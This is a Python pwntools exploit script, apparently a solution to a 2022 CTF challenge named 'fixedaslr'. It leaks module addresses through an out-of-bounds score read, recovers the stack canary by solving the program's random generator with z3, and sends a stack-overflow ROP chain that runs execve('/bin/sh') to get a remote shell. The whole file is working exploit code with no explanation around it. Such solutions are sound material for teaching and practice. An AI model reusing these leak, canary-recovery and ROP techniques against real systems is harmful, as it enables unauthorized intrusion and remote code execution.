#!/usr/bin/python3

from pwn import *
import subprocess
import struct

exe = ELF('./loader', checksec=False)
context.binary = exe
context.log_level = 'debug'

def rand_extract_bit(bit):
	global rand_state
	return (rand_state >> bit) & 1

def rand_get_bit():
	global rand_state
	bit0 = rand_extract_bit(63)
	bit1 = rand_extract_bit(61) ^ bit0
	bit2 = rand_extract_bit(60) ^ bit1
	bit4 = rand_extract_bit(58) ^ bit2 ^ 1
	rand_state = ((2 * rand_state) | bit4) & 0xffffffffffffffff
	return bit4

def rand(bit):
	num = 0
	for i in range(bit):
		b = rand_get_bit()
		num = (2 * num) | b
	return num

def playgame(roundnum):
	p.sendlineafter(b'choice?\n', b'1')
	for i in range(roundnum):
		datas = p.recvuntil(b' ?\n', drop=True).split(b' ')
		p.sendline(str(int(datas[-1]) + int(datas[-3])).encode())
	datas = p.recvuntil(b' ?\n', drop=True).split(b' ')
	p.sendline(str(int(datas[-1]) + int(datas[-3]) + 1).encode())

def seescore(idx):
	p.sendlineafter(b'choice?\n', b'3')
	p.sendlineafter(b'(0-9)?\n', str(u64(struct.pack("<q", idx))).encode())
	p.recvuntil(b'score: ')
	return int(p.recvline()[:-1])
	
# p = process(exe.path)
p = remote('fixedaslr.2022.ctfcompetition.com', 1337)

#####################################
### Stage 1: Leak ASLR --> Canary ###
#####################################
from z3 import *

main_o = seescore(512) & 0xfffffffffffff000
guard_o = seescore(-1017) & 0xfffffffffffff000
game_o = seescore(-1019) & 0xfffffffffffff000
res_o = seescore( int(((game_o + 0x1000) - main_o)/8) ) & 0xfffffffffffff000
syscalls_o = seescore( int(((guard_o - 0x1000) - main_o)/8) + 1 ) & 0xfffffffffffff000
basic_o = seescore( int(((game_o - 0x1000) - main_o)/8) + 1 ) & 0xfffffffffffff000

known_states = [0]*6
known_states[0] = main_o >> 28
known_states[1] = syscalls_o >> 28
known_states[2] = guard_o >> 28
known_states[3] = basic_o >> 28
known_states[4] = game_o >> 28
known_states[5] = res_o >> 28

s = Solver()
rand_state = BitVec('x', 64)

for known_state in known_states:
	s.add(rand(0xc) == known_state)
if s.check() == sat:
	model = s.model()
	canary = model[BitVec('x', 64)].as_long()
log.info("Canary: " + hex(canary))

#######################################
### Stage 2: Get address of debug.o ###
#######################################
rand_state = canary
for i in range(6):
	rand(0xc)
debug_o = rand(0xc) << 28
log.info("debug_o: " + hex(debug_o))

#########################
### Stage 3: ROPchain ###
#########################
playgame(20)
pop_rsi = debug_o + 0x1000 + 0x4
pop_rax = debug_o + 0x1000 + 0x7
pop_rdx = debug_o + 0x1000 + 0x10
syscall = syscalls_o + 2
p.sendlineafter(b'(0-31)?\n', str(0x1000).encode())
payload = flat(
	b'/bin/sh\x00',
	b'A'*0x20, canary,
	b'B'*8,             # Fake rbp
	pop_rax, 0x3b,
	pop_rsi, 0,
	pop_rdx, 0,
	syscall,
	)
p.sendafter(b'name:\n', payload)

p.interactive()